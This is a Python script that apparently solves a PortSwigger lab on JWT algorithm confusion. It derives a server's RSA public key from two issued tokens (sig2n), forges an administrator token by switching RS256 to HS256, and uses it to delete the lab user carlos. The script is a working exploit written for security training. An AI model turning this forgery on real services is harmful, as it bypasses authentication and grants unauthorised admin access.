#!/usr/bin/env python3
"""
JWT authentication bypass via algorithm confusion with no exposed key
PortSwigger Web Security Academy -- JWT

Companion script for the writeup: 08-algorithm-confusion-no-exposed-key.md

What this does:
    Logs in twice to obtain two distinct JWTs signed by the same server RSA
    key (retrying once with a short delay if both logins return identical
    tokens, in case of caching), then derives the server's RSA public
    modulus mathematically from the two signatures -- the "sig2n" technique.

    For an RSA signature s over a PKCS#1 v1.5-padded message hash m with
    public exponent e, s^e mod n == m, so s^e - m is an exact multiple of n.
    Two signatures from the same key give n = gcd(s1^e - m1, s2^e - m2)
    after stripping small extraneous prime factors the GCD can pick up.
    This is tried for both 2048-bit and 4096-bit key-size assumptions,
    since the PKCS#1 padding length depends on knowing the key size.

    Once a candidate public key is derived, it's reused for the exact same
    algorithm-confusion forgery as the previous lab (RS256 -> HS256, PEM
    bytes as the HMAC secret), tried against each candidate key in turn
    until the admin-panel-and-delete-carlos flow succeeds.

    This needs gmpy2 (GMP-backed big-integer arithmetic) -- Python's
    built-in arbitrary-precision ints are far too slow for s^65537 on a
    2048-bit integer. PortSwigger's own sig2n Docker tool does the same
    computation; this reimplements it directly instead of shelling out to
    Docker.

Usage:
    python 08-algorithm-confusion-no-exposed-key.py <lab-url>
    e.g. python 08-algorithm-confusion-no-exposed-key.py https://0a1b00fa03d9c8b6803b56b400eb00d5.web-security-academy.net

Requirements:
    pip install httpx cryptography gmpy2
"""

import base64
import hashlib
import hmac
import json
import re
import sys
import time
import httpx

from cryptography.hazmat.primitives.asymmetric.rsa import RSAPublicNumbers
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.backends import default_backend

# SHA-256 DigestInfo prefix for PKCS#1 v1.5
DIGEST_INFO = bytes.fromhex("3031300d060960864801650304020105000420")


def _b64url_encode(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()


def _b64url_decode(s: str) -> bytes:
    s += "=" * (4 - len(s) % 4)
    return base64.urlsafe_b64decode(s)


def decode_jwt(token: str) -> tuple[dict, dict, str]:
    parts = token.split(".")
    header = json.loads(_b64url_decode(parts[0]))
    payload = json.loads(_b64url_decode(parts[1]))
    sig = parts[2] if len(parts) > 2 else ""
    return header, payload, sig


def encode_jwt(header: dict, payload: dict, secret: bytes, algorithm: str = "HS256") -> str:
    h = _b64url_encode(json.dumps(header, separators=(",", ":")).encode())
    p = _b64url_encode(json.dumps(payload, separators=(",", ":")).encode())
    signing_input = f"{h}.{p}".encode()
    sig = hmac.new(secret, signing_input, hashlib.sha256).digest()
    return f"{h}.{p}.{_b64url_encode(sig)}"


def exploit_algo_confusion(jwt_token: str, new_claims: dict, public_key_pem: str) -> str:
    """Forge a JWT using algorithm confusion (RS256 -> HS256), signing with the RSA public key PEM as the HMAC secret."""
    header, payload, _ = decode_jwt(jwt_token)
    payload.update(new_claims)
    header["alg"] = "HS256"
    return encode_jwt(header, payload, public_key_pem.encode(), "HS256")


def derive_public_key_from_jwts(jwt1: str, jwt2: str, e: int = 65537) -> list[str]:
    """Derive RSA public key(s) from two JWTs signed by the same key (sig2n).

    n = gcd(s1^e - m1, s2^e - m2) after removing small factors.
    Returns candidate PEM public keys (X.509 SubjectPublicKeyInfo) to try.
    """
    import gmpy2

    def _jwt_sig_and_padded(jwt_str: str, key_bits: int):
        parts = jwt_str.split(".")
        signing_input = f"{parts[0]}.{parts[1]}".encode()
        sig_bytes = _b64url_decode(parts[2])
        sig_int = gmpy2.mpz(int.from_bytes(sig_bytes, "big"))

        h = hashlib.sha256(signing_input).digest()
        key_bytes = key_bits // 8
        t = DIGEST_INFO + h
        ps_len = key_bytes - len(t) - 3
        padded = b"\x00\x01" + (b"\xff" * ps_len) + b"\x00" + t
        padded_int = gmpy2.mpz(int.from_bytes(padded, "big"))
        return sig_int, padded_int

    def _clean_n(n_candidate, key_bits: int):
        for p in [2, 3, 5, 7, 11, 13, 17, 19, 23, 29, 31, 37, 41, 43, 47]:
            while n_candidate % p == 0:
                n_candidate //= p
        n_int = int(n_candidate)
        if n_int > 1 and abs(n_int.bit_length() - key_bits) <= 4:
            return n_int
        return None

    results = []
    for key_bits in [2048, 4096]:
        print(f"[*] Trying key size: {key_bits} bits...", flush=True)
        s1, m1 = _jwt_sig_and_padded(jwt1, key_bits)
        s2, m2 = _jwt_sig_and_padded(jwt2, key_bits)

        print(f"[*] Computing s1^e (gmpy2 accelerated)...", flush=True)
        val1 = s1 ** e - m1
        print(f"[*] Computing s2^e...", flush=True)
        val2 = s2 ** e - m2

        print(f"[*] Computing GCD...", flush=True)
        n_candidate = gmpy2.gcd(val1, val2)

        n_clean = _clean_n(n_candidate, key_bits)
        if n_clean:
            print(f"[+] Found candidate n ({n_clean.bit_length()} bits)", flush=True)
            pub = RSAPublicNumbers(e, n_clean).public_key(default_backend())
            pem = pub.public_bytes(
                serialization.Encoding.PEM,
                serialization.PublicFormat.SubjectPublicKeyInfo,
            ).decode()
            results.append(pem)
        else:
            print(f"[-] No valid n found for {key_bits}-bit key", flush=True)

    return results


def _login(client: httpx.Client, base: str, username: str = "wiener", password: str = "peter") -> str:
    r = client.get(f"{base}/login")
    m = re.search(r'name="csrf"\s+value="([^"]+)"', r.text)
    csrf = m.group(1) if m else ""

    r = client.post(f"{base}/login", data={
        "csrf": csrf, "username": username, "password": password
    }, follow_redirects=False)
    if r.status_code in (301, 302):
        loc = r.headers.get("location", "/")
        if loc.startswith("/"):
            loc = f"{base}{loc}"
        client.get(loc, follow_redirects=True)
    return client.cookies.get("session", "")


def _admin_delete_carlos(client: httpx.Client, lab_url: str, forged: str) -> bool:
    client.cookies.clear()
    client.cookies.set("session", forged)
    r = client.get(f"{lab_url}/admin")
    print(f"[*] /admin -> {r.status_code}")

    if "/admin/delete" in r.text:
        r = client.get(f"{lab_url}/admin/delete?username=carlos")
        print(f"[*] Delete carlos -> {r.status_code}")

    check = client.get(lab_url)
    if "Congratulations" in check.text:
        print("[+] Lab solved.")
        return True
    print("[-] Not solved with this candidate key")
    return False


def solve(lab_url: str) -> None:
    client = httpx.Client(follow_redirects=True, timeout=15)

    session1 = _login(client, lab_url)
    if not session1:
        print("[-] Login 1 failed")
        return
    print(f"[+] JWT 1: {session1[:50]}...")

    client.cookies.clear()
    session2 = _login(client, lab_url)
    if not session2:
        print("[-] Login 2 failed")
        return
    print(f"[+] JWT 2: {session2[:50]}...")

    if session1 == session2:
        print("[!] Tokens are identical -- server may cache JWTs, retrying in 2s...")
        time.sleep(2)
        client.cookies.clear()
        session2 = _login(client, lab_url)
        print(f"[+] JWT 2 (retry): {session2[:50]}...")

    print("[*] Deriving RSA public key from two JWTs (sig2n)...")
    try:
        pem_keys = derive_public_key_from_jwts(session1, session2)
    except ImportError:
        print("[-] gmpy2 is required for this derivation: pip install gmpy2")
        return

    if not pem_keys:
        print("[-] Could not derive a public key")
        print(f"[!] Fallback: docker run --rm -it portswigger/sig2n {session1} {session2}")
        return

    for i, pem in enumerate(pem_keys):
        print(f"[*] Trying derived key {i + 1}/{len(pem_keys)}...")
        forged = exploit_algo_confusion(session1, {"sub": "administrator"}, pem)
        if _admin_delete_carlos(client, lab_url, forged):
            return

    print("[-] None of the derived keys worked")
    print("[!] Try X.509 vs PKCS1 format, or check the key derivation")


if __name__ == "__main__":
    if len(sys.argv) != 2:
        print(f"Usage: python {sys.argv[0]} <lab-url>")
        sys.exit(1)
    solve(sys.argv[1].rstrip("/"))
